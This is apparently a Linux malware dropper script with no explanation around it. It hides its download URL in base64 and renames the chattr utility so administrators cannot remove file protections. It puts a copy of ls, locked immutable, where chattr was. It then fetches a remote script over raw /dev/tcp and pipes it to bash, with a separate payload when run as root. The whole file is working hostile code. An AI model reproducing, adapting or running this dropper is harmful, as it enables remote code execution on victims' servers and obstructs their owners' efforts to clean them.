#!/bin/bash
#variables
lspath=$(which ls)
domain=$(echo Yi45LTktOC5jb20K|base64 -d)
mainurl=$(echo aHR0cDovL2IuOS05LTguY29tL2JyeXNqCg==|base64 -d)
#mv command

if [ -x /bin/chattr ];then
    mv /bin/chattr /bin/zzhcht
elif [ -x /usr/bin/chattr ];then
    mv /usr/bin/chattr /usr/bin/zzhcht
elif [ -x /usr/bin/zzhcht ];then
    export CHATTR=/usr/bin/zzhcht
elif [ -x /bin/zzhcht ];then
    export CHATTR=/bin/zzhcht
else 
   if [ $(command -v yum) ];then 
	yum -y reinstall e2fsprogs
	if [ -x /bin/chattr ];then
           mv /bin/chattr /bin/zzhcht
   elif [ -x /usr/bin/chattr ];then
           mv /usr/bin/chattr /usr/bin/zzhcht
	fi
   else
	apt-get -y reinstall e2fsprogs
	if [ -x /bin/chattr ];then
          mv /bin/chattr /bin/zzhcht
  elif [ -x /usr/bin/chattr ];then
          mv /usr/bin/chattr /usr/bin/zzhcht
	fi
   fi
fi
if [ -x /bin/zzhcht ];then
    export CHATTR=/bin/zzhcht && cp $lspath /bin/chattr && /bin/zzhcht +ia /bin/chattr
elif [ -x /usr/bin/zzhcht ];then
    export CHATTR=/usr/bin/zzhcht && cp $lspath /usr/bin/chattr && /usr/bin/zzhcht +ia  /usr/bin/chattr
else
    export CHATTR=chattr
fi


vurl() {
	IFS=/ read -r proto x host query <<<"$1"
    exec 3<>"/dev/tcp/${host}/${PORT:-80}"
    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host}\r\n\r\n" >&3
    (while read -r l; do echo >&2 "$l"; [[ $l == $'\r' ]] && break; done && cat ) <&3
    exec 3>&-
}

if [ "$(id -u)" = "0" ];then 
vurl  ${mainurl}/d/ar.sh |bash
else
vurl  ${mainurl}/d/ai.sh |bash
fi
